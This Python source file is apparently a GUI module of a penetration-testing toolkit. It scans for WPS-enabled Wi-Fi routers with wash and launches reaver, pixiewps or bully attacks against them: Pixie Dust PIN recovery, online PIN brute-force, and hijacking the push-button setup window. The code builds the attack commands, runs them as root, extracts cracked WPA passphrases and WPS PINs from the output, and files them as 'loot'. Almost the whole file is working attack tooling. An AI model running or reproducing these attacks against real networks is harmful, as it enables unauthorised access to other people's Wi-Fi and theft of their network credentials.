"""WPS attacks -- wash scan, reaver brute + Pixie Dust, PBC race.

Wi-Fi Protected Setup (WPS) is the "one-button" method routers use to
onboard clients. It has three well-known ways to lose:

* **Pixie Dust** -- some SoC firmwares generate the E-S1/E-S2 nonces
  with a weak RNG, so given a single M1..M3 transcript we can recover
  the PIN offline in seconds via ``pixiewps``. Reaver has ``-K`` to
  drive this automatically.
* **Online PIN brute-force** -- default. Newer APs implement lockout
  after N failures, so this is slow and usually noisy, but a router
  that leaves lockout off still falls in a few hours.
* **PBC (push-button config) race** -- when a legitimate user pushes
  the WPS button, the AP enters a 120 s window during which anyone
  in range can complete the WPS handshake. We hijack that window and
  walk away with the PSK.

This screen wraps ``wash`` (WPS scanner, JSON output when available)
so every visible WPS AP shows up with its lock status and estimated
attack time, then dispatches ``reaver`` / ``pixiewps`` / ``bully``
for the actual pop. Cracked PSKs land in the loot store the same
way as PMKID/handshake output.
"""
from __future__ import annotations

import json
import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

DEFAULT_IFACE = "wlan1mon"

# reaver / bully both log the recovered PSK / PIN with a stable
# marker.  Grab it out of the stdout stream so we can annotate the
# loot row automatically.
_REAVER_PSK_RE = re.compile(
    r"WPA PSK\s*[:=]\s*'?([^\r\n']+)'?", re.IGNORECASE)
_REAVER_PIN_RE = re.compile(
    r"WPS PIN\s*[:=]\s*'?(\d{7,8})'?", re.IGNORECASE)


@register
class WifiAttacks(NHModule):
    title = "Wi-Fi (WPS)"
    icon = "network-wireless-symbolic"
    description = ("Wash + Reaver + Pixie Dust + WPS-PBC race for "
                   "WPS-vulnerable routers")
    required_tools = ["wash", "reaver"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._wash_proc: Process | None = None
        self._attack_proc: Process | None = None
        self._aps: dict[str, dict] = {}
        self._ap_rows: list[Adw.ExpanderRow] = []
        self._loot_id: int | None = None
        self._selected_bssid: str = ""
        self._selected_channel: str = ""

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        cfg = Adw.PreferencesGroup(
            title="WPS scan",
            description="wash lists every visible AP that has WPS "
                        "advertised. Locked APs will not fall to "
                        "brute-force but might still be Pixie-dusted.")
        self.iface = Adw.EntryRow(title="Monitor interface")
        self.iface.set_text(DEFAULT_IFACE)
        cfg.add(self.iface)

        scan_row = Adw.ActionRow(
            title="Scan for WPS APs",
            subtitle="Streams live; press Stop when you have enough")
        self.scan_btn = Gtk.Button(label="Scan",
                                   valign=Gtk.Align.CENTER)
        self.scan_btn.add_css_class("suggested-action")
        self.scan_btn.connect("clicked",
                              lambda _b: self._start_wash())
        scan_row.add_suffix(self.scan_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked",
                              lambda _b: self._stop_wash())
        scan_row.add_suffix(self.stop_btn)
        cfg.add(scan_row)
        box.append(cfg)

        # ---- results
        self.results_group = Adw.PreferencesGroup(
            title="WPS APs",
            description="Rows expand to per-AP actions")
        self._empty_row = Adw.ActionRow(
            title="No APs yet",
            subtitle="Enable monitor mode and press Scan")
        self.results_group.add(self._empty_row)
        box.append(self.results_group)

        # ---- manual attack panel (when the user comes in from a
        # deep-link with only a BSSID string)
        atk_group = Adw.PreferencesGroup(
            title="Manual attack",
            description="Fill in a BSSID + channel and pick the "
                        "attack shape.")
        self.bssid = Adw.EntryRow(title="Target BSSID")
        atk_group.add(self.bssid)
        self.channel = Adw.EntryRow(title="Channel")
        atk_group.add(self.channel)

        self.mode = Adw.ComboRow(title="Attack")
        self.mode.set_model(Gtk.StringList.new([
            "Pixie Dust (reaver -K)",
            "Online brute-force (reaver)",
            "PBC hijack (reaver -p '' -K 0 -N)",
            "Bully brute-force",
        ]))
        atk_group.add(self.mode)

        run_row = Adw.ActionRow(
            title="Run attack",
            subtitle="")
        self.attack_btn = Gtk.Button(label="Attack",
                                     valign=Gtk.Align.CENTER)
        self.attack_btn.add_css_class("destructive-action")
        self.attack_btn.connect(
            "clicked", lambda _b: self._start_attack())
        run_row.add_suffix(self.attack_btn)
        self.attack_stop_btn = Gtk.Button(label="Stop",
                                          valign=Gtk.Align.CENTER)
        self.attack_stop_btn.set_sensitive(False)
        self.attack_stop_btn.connect(
            "clicked", lambda _b: self._stop_attack())
        run_row.add_suffix(self.attack_stop_btn)
        atk_group.add(run_row)
        box.append(atk_group)

        # ---- output
        self.output = OutputView()
        box.append(self.output)
        return box

    # ---------------------------------------------------------- wash
    def _start_wash(self) -> None:
        if self._wash_proc is not None:
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE

        # Reset the results table.
        for r in self._ap_rows:
            self.results_group.remove(r)
        self._ap_rows = []
        self._aps = {}
        self._empty_row.set_visible(True)
        self._empty_row.set_title("Scanning…")

        argv = ["wash", "-i", iface, "-j"]
        self.output.append("$ " + " ".join(argv) + "\n")

        def on_line(text: str) -> None:
            self.output.append(text)
            for line in (text or "").splitlines():
                line = line.strip()
                if not line.startswith("{"):
                    continue
                try:
                    obj = json.loads(line)
                except ValueError:
                    continue
                bssid = (obj.get("bssid") or "").lower()
                if not bssid:
                    continue
                # Track fields wash gives us. Locked = 0/1 (int) or
                # "yes"/"no" depending on version.
                self._aps[bssid] = {
                    "essid": obj.get("essid", ""),
                    "channel": str(obj.get("channel", "")),
                    "power": str(obj.get("rssi", "")),
                    "locked": obj.get("wps_locked", 0),
                    "vendor": obj.get("wps_manufacturer", ""),
                    "model": obj.get("wps_model_name", ""),
                }
            self._render_aps()

        def on_done(code: int) -> None:
            self.output.append("[wash exited: %d]\n" % code)
            self._wash_proc = None
            self.scan_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)

        self._wash_proc = Process(
            argv, on_line, on_done, root=True)
        self._wash_proc.start()
        self.scan_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)

    def _stop_wash(self) -> None:
        if self._wash_proc is not None:
            self._wash_proc.stop()

    def _render_aps(self) -> None:
        for r in self._ap_rows:
            self.results_group.remove(r)
        self._ap_rows = []
        if not self._aps:
            self._empty_row.set_visible(True)
            self._empty_row.set_title("No WPS APs yet")
            return
        self._empty_row.set_visible(False)
        for bssid, ap in self._aps.items():
            self._ap_rows.append(self._make_row(bssid, ap))

    def _make_row(self, bssid: str, ap: dict) -> Adw.ExpanderRow:
        locked = ap.get("locked")
        locked_bool = bool(locked) if isinstance(locked, int) \
            else str(locked).lower() in ("yes", "true", "1")
        title = (ap.get("essid") or "<hidden>") + \
                (" 🔒" if locked_bool else "")
        subtitle = "%s · ch %s · %s dBm · %s %s" % (
            bssid, ap.get("channel", "?"), ap.get("power", "?"),
            ap.get("vendor", "") or "", ap.get("model", "") or "")
        row = Adw.ExpanderRow(title=title, subtitle=subtitle)
        estimate = "Pixie Dust ~15 s if firmware weak"
        if locked_bool:
            estimate = "Locked -- brute-force will not work; try " \
                       "Pixie Dust only"
        row.add_row(Adw.ActionRow(title="Estimate",
                                  subtitle=estimate))
        for label, mode in (
                ("Pixie Dust", 0),
                ("Online brute-force", 1),
                ("PBC hijack", 2),
                ("Bully brute-force", 3)):
            r = Adw.ActionRow(title=label, subtitle="")
            btn = Gtk.Button(label="Attack",
                             valign=Gtk.Align.CENTER)
            btn.add_css_class("destructive-action")
            btn.connect(
                "clicked",
                lambda _b, b=bssid, c=ap.get("channel", ""),
                       e=ap.get("essid", ""),
                       m=mode:
                    self._quick_attack(b, c, e, m))
            r.add_suffix(btn)
            row.add_row(r)
        self.results_group.add(row)
        return row

    def _quick_attack(self, bssid: str, channel: str, essid: str,
                      mode: int) -> None:
        self.bssid.set_text(bssid)
        self.channel.set_text(channel)
        self.mode.set_selected(mode)
        self._start_attack(essid=essid)

    # ------------------------------------------------------- attack
    def _start_attack(self, essid: str = "") -> None:
        if self._attack_proc is not None:
            return
        bssid = self.bssid.get_text().strip()
        if not bssid:
            toast(self.app_window,
                  "Set a target BSSID first")
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        channel = self.channel.get_text().strip()
        mode = self.mode.get_selected()

        argv: list[str]
        if mode == 3:
            # Bully binary; different flag set.
            argv = ["bully", "-b", bssid, iface]
            if channel:
                argv += ["-c", channel]
        else:
            argv = ["reaver", "-i", iface, "-b", bssid, "-vv"]
            if channel:
                argv += ["-c", channel]
            if mode == 0:
                argv += ["-K", "1"]  # Pixie Dust
            elif mode == 2:
                # PBC hijack: null PIN, small session-key retries.
                argv += ["-p", "''", "-K", "0", "-N", "-a"]
        self.output.append("$ " + " ".join(argv) + "\n")

        stamp = time.strftime("%Y%m%d-%H%M%S")
        log_path = loot_path(
            "wps", "wps-%s-%s.log" % (bssid.replace(":", ""), stamp))
        self._loot_id = get_loot_store().record(
            module="wifi_attacks", type="wps_log",
            target=essid + " (" + bssid + ")",
            path=log_path,
            notes="mode=%d" % mode)

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass
            psk = _REAVER_PSK_RE.search(text or "")
            pin = _REAVER_PIN_RE.search(text or "")
            if psk and self._loot_id is not None:
                get_loot_store().set_wpasec(
                    self._loot_id, "cracked",
                    psk=psk.group(1),
                    notes="reaver recovered PSK")
                toast(self.app_window,
                      "Recovered PSK: " + psk.group(1))
            if pin and self._loot_id is not None:
                get_loot_store().append_notes(
                    self._loot_id,
                    "WPS PIN: " + pin.group(1))

        def on_done(code: int) -> None:
            self.output.append("[attack exited: %d]\n" % code)
            self._attack_proc = None
            self.attack_btn.set_sensitive(True)
            self.attack_stop_btn.set_sensitive(False)
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._attack_proc = Process(
            argv, on_line, on_done, root=True)
        self._attack_proc.start()
        self.attack_btn.set_sensitive(False)
        self.attack_stop_btn.set_sensitive(True)

    def _stop_attack(self) -> None:
        if self._attack_proc is not None:
            self._attack_proc.stop()

    def set_target(self, target: str) -> None:
        if not target:
            return
        # Accept BSSID or BSSID|channel|SSID
        parts = target.split("|")
        if parts[0]:
            self.bssid.set_text(parts[0])
        if len(parts) > 1 and parts[1]:
            self.channel.set_text(parts[1])
